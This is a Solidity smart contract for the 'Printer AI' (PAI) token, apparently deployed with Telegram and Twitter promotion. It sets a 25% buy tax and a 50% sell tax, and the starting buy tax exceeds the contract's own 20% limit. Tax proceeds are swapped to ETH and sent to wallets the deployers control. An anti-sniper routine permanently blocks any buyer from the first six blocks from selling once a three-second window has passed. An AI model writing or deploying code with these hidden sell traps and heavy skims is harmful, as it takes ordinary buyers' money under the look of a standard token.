1 // SPDX-License-Identifier: MIT
2 /**  
3 Printing More Than Tether
4 TG: https://t.me/PrinterAI
5 Twitter: https://twitter.com/printerai
6 */
7 pragma solidity ^0.8.19;
8 
9 library Address{
10     function sendValue(address payable recipient, uint256 amount) internal {
11         require(address(this).balance >= amount, "Address: insufficient balance");
12 
13         (bool success, ) = recipient.call{value: amount}("");
14         require(success, "Address: unable to send value, recipient may have reverted");
15     }
16 }
17 
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address payable) {
20         return payable(msg.sender);
21     }
22 
23     function _msgData() internal view virtual returns (bytes memory) {
24         this;
25         return msg.data;
26     }
27 }
28 
29 abstract contract Ownable is Context {
30     address private _owner;
31 
32     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
33 
34     constructor() {
35         _setOwner(_msgSender());
36     }
37 
38     function owner() public view virtual returns (address) {
39         return _owner;
40     }
41 
42     modifier onlyOwner() {
43         require(owner() == _msgSender(), "Ownable: caller is not the owner");
44         _;
45     }
46 
47     function renounceOwnership() public virtual onlyOwner {
48         _setOwner(address(0));
49     }
50 
51     function transferOwnership(address newOwner) public virtual onlyOwner {
52         require(newOwner != address(0), "Ownable: new owner is the zero address");
53         _setOwner(newOwner);
54     }
55 
56     function _setOwner(address newOwner) private {
57         address oldOwner = _owner;
58         _owner = newOwner;
59         emit OwnershipTransferred(oldOwner, newOwner);
60     }
61 }
62 
63 interface IERC20 {
64     function totalSupply() external view returns (uint256);
65     function balanceOf(address account) external view returns (uint256);
66     function transfer(address recipient, uint256 amount) external returns (bool);
67     function allowance(address owner, address spender) external view returns (uint256);
68     function approve(address spender, uint256 amount) external returns (bool);
69     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
70     event Transfer(address indexed from, address indexed to, uint256 value);
71     event Approval(address indexed owner, address indexed spender, uint256 value);
72 }
73 
74 interface IFactory{
75     function createPair(address tokenA, address tokenB) external returns (address pair);
76 }
77 
78 interface IRouter {
79     function factory() external pure returns (address);
80     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
81     function WETH() external pure returns (address);
82     function addLiquidityETH(
83         address token,
84         uint amountTokenDesired,
85         uint amountTokenMin,
86         uint amountETHMin,
87         address to,
88         uint deadline
89     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
90     function swapExactTokensForETHSupportingFeeOnTransferTokens(
91         uint amountIn,
92         uint amountOutMin,
93         address[] calldata path,
94         address to,
95         uint deadline) external;
96 }
97 
98 contract PrinterAI is Context, IERC20, Ownable {
99 
100     using Address for address payable;
101 
102     IRouter public router;
103     address public pair;
104     
105     mapping (address => uint256) private _tOwned;
106     mapping (address => mapping (address => uint256)) private _allowances;
107     mapping (address => uint256) private _sniperWindowTime;
108     mapping (address => bool) public _isExcludedFromFee;
109     mapping (address => bool) public _isExcludedFromMaxBalance;
110 
111     uint8 private constant _decimals = 9; 
112     uint256 private _tTotal = 1_000_000 * (10**_decimals);
113     uint256 public swapThreshold = 5_000 * (10**_decimals); 
114     uint256 public maxTxAmount = 20_000 * (10**_decimals);
115     uint256 public maxWallet =  20_000 * (10**_decimals);
116     
117     uint8 public buyTax = 25;
118     uint8 public sellTax = 50;
119 
120     string private constant _name = "Printer AI"; 
121     string private constant _symbol = "PAI";
122 
123     address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
124     address public marketingWallet = 0x06D35fd14cB1F80d085B33780F634c237921ba23;
125     address public treasuryWallet = 0x265f05b5A1F083b337616d64f4B43f33CB7088C6;
126     address public autoLPWallet = 0x06D35fd14cB1F80d085B33780F634c237921ba23;
127 
128     bool private swapping;
129     modifier lockTheSwap {
130         swapping = true;
131         _;
132         swapping = false;
133     }
134 
135     uint256 private _snipeGenesisB;
136     uint256 public snipersCaught;
137     
138     constructor () {
139         _tOwned[_msgSender()] = _tTotal;
140         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
141         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
142         router = _router;
143         pair = _pair;
144         _approve(owner(), address(router), ~uint256(0));
145 
146         _isExcludedFromFee[owner()] = true;
147         _isExcludedFromFee[address(this)] = true;
148         _isExcludedFromFee[marketingWallet] = true;
149         _isExcludedFromFee[treasuryWallet] = true;
150         _isExcludedFromFee[DEAD] = true;
151 
152         _isExcludedFromMaxBalance[owner()] = true;
153         _isExcludedFromMaxBalance[address(this)] = true;
154         _isExcludedFromMaxBalance[pair] = true;
155         _isExcludedFromMaxBalance[marketingWallet] = true;
156         _isExcludedFromMaxBalance[treasuryWallet] = true;
157         _isExcludedFromMaxBalance[DEAD] = true;
158         
159         emit Transfer(address(0), _msgSender(), _tTotal);
160     }
161 
162     function name() public pure returns (string memory) {
163         return _name;
164     }
165 
166     function symbol() public pure returns (string memory) {
167         return _symbol;
168     }
169 
170     function decimals() public pure returns (uint8) {
171         return _decimals;
172     }
173 
174     function totalSupply() public view override returns (uint256) {
175         return _tTotal;
176     }
177 
178     function balanceOf(address account) public view override returns (uint256) {
179         return _tOwned[account];
180     }
181 
182     function transfer(address recipient, uint256 amount) public override returns (bool) {
183         _transfer(_msgSender(), recipient, amount);
184         return true;
185     }
186 
187     function allowance(address owner, address spender) public view override returns (uint256) {
188         return _allowances[owner][spender];
189     }
190 
191     function approve(address spender, uint256 amount) public override returns (bool) {
192         _approve(_msgSender(), spender, amount);
193         return true;
194     }
195 
196     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
197         _transfer(sender, recipient, amount);
198         _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
199         return true;
200     }
201 
202     function _approve(address owner, address spender, uint256 amount) private {
203         require(owner != address(0), "ERC20: approve from the zero address");
204         require(spender != address(0), "ERC20: approve to the zero address");
205         _allowances[owner][spender] = amount;
206         emit Approval(owner, spender, amount);
207     }
208     
209     function _sniperCheck(address from,address to, bool isBuy) internal{
210         if(isBuy){
211             if(block.number < _snipeGenesisB + 6){
212                 snipersCaught++;
213                 _sniperWindowTime[to] = block.timestamp + 3;
214             }
215         }else{
216             if (isSniper(from))
217                 require(block.timestamp < _sniperWindowTime[from]);
218         }
219     }
220     
221     function _preTransferCheck(address from,address to,uint256 amount) internal {
222         require(from != address(0), "ERC20: transfer from the zero address");
223         require(to != address(0), "ERC20: transfer to the zero address");
224         require(amount > 0, "Transfer amount must be greater than zero");
225         require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the maxTxAmount.");
226         require(balanceOf(to) + amount <= maxWallet || _isExcludedFromMaxBalance[to], "Transfer amount exceeds the maxWallet.");
227         if(from == owner() && to == pair && balanceOf(pair) == 0)
228             _snipeGenesisB = block.number;
229         if (balanceOf(address(this)) >= swapThreshold && !swapping && from != pair && from != owner() && to != owner())
230             swapAndLiquify();
231     }
232 
233     function _getValues(address from,address to, uint256 amount) private returns(uint256){
234         uint256 taxedTokens = amount * buyTax / 100;
235         if(to == pair)
236             taxedTokens = amount * sellTax / 100;
237         if (taxedTokens > 0){
238             _tOwned[address(this)] += taxedTokens;
239             emit Transfer (from, address(this), taxedTokens);
240         }
241         return (amount - taxedTokens);
242     }
243     
244     function _transfer(address from,address to,uint256 amount) private {
245         _preTransferCheck(from, to, amount);
246         _tOwned[from] -= amount;
247         uint256 transferAmount = amount;
248         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
249             transferAmount = _getValues(from, to, amount);
250             _sniperCheck(from,to,from == pair);
251         }
252         _tOwned[to] += transferAmount;
253         emit Transfer(from, to, transferAmount);
254     }
255 
256     function swapAndLiquify() private lockTheSwap{
257 
258         uint256 tokensForMarketing = swapThreshold * 40 / 100;
259         uint256 tokensForTreasury = swapThreshold * 40 / 100;
260         uint256 tokensForLiquidity = swapThreshold * 20 / 100;
261         
262         if(tokensForMarketing > 0){
263             uint256 ethSwapped = swapTokensForETH(tokensForMarketing);
264             if(ethSwapped > 0)
265                 payable(marketingWallet).transfer(ethSwapped);
266         }
267 
268         if(tokensForTreasury > 0){
269             uint256 ethSwapped = swapTokensForETH(tokensForTreasury);
270             if(ethSwapped > 0)
271                 payable(treasuryWallet).transfer(ethSwapped);
272         }
273 
274         if(tokensForLiquidity > 0){
275             uint half = tokensForLiquidity / 2;
276             uint otherHalf = tokensForLiquidity - half;
277             uint balAutoLP = swapTokensForETH(half);
278             if (balAutoLP > 0)
279                 addLiquidity(otherHalf, balAutoLP);
280         }
281 
282         if (address(this).balance > 0)
283             payable(marketingWallet).sendValue(address(this).balance);
284 
285     }
286 
287     function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
288         uint256 initialBalance = address(this).balance;
289         address[] memory path = new address[](2);
290         path[0] = address(this);
291         path[1] = router.WETH();
292 
293         _approve(address(this), address(router), tokenAmount);
294 
295         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
296             tokenAmount,
297             0,
298             path,
299             address(this),
300             block.timestamp
301         );
302         return (address(this).balance - initialBalance);
303     }
304 
305     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
306         _approve(address(this), address(router), tokenAmount);
307 
308         (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
309             address(this),
310             tokenAmount,
311             0,
312             0,
313             autoLPWallet,
314             block.timestamp
315         );
316         
317         if (ethAmount - ethFromLiquidity > 0)
318             payable(marketingWallet).sendValue (ethAmount - ethFromLiquidity);
319     }
320 
321     receive() external payable {}
322     
323     function getBalances(address[] memory holders) public view returns(uint[] memory){
324         uint length = holders.length;
325         uint[] memory accountBalances = new uint[](length);
326         for (uint i = 0; i < length; i++) {
327             accountBalances[i] = balanceOf(holders[i]);
328         }
329         return accountBalances;
330     }
331 
332     function isSniper(address holder) public view returns(bool){
333         return _sniperWindowTime[holder] > 0 ? true : false;
334     }
335 
336     function setContractLimits(uint256 maxTxAmountEXACT_ , uint256 maxWalletEXACT_) external onlyOwner{
337         uint256 minimumAmount = 5_000 * (10**_decimals);
338         require(maxTxAmountEXACT_ * (10**_decimals) >= minimumAmount, "Invalid Settings!");
339         require(maxWalletEXACT_ * (10**_decimals) >= minimumAmount, "Invalid Settings!");
340         maxTxAmount = maxTxAmountEXACT_ * (10**_decimals);
341         maxWallet = maxWalletEXACT_ * (10**_decimals);
342     }
343 
344     function setContractSettings(uint8 buyTax_ , uint8 sellTax_) external onlyOwner{
345         require(buyTax_ <= 20 && sellTax_ <= 50, "Invalid Settings!");
346         buyTax = buyTax_; 
347         sellTax = sellTax_;
348     }
349 
350     function manualSwap() external{
351         require(msg.sender == marketingWallet);
352         uint256 tokenBalance = balanceOf(address(this));
353         if(tokenBalance > 0){
354             uint256 ethSwapped = swapTokensForETH(tokenBalance);
355             if(ethSwapped > 0)
356                 payable(marketingWallet).transfer(ethSwapped);
357         }
358         if (address(this).balance > 0)
359             payable(marketingWallet).sendValue(address(this).balance);
360     }
361 
362 
363 }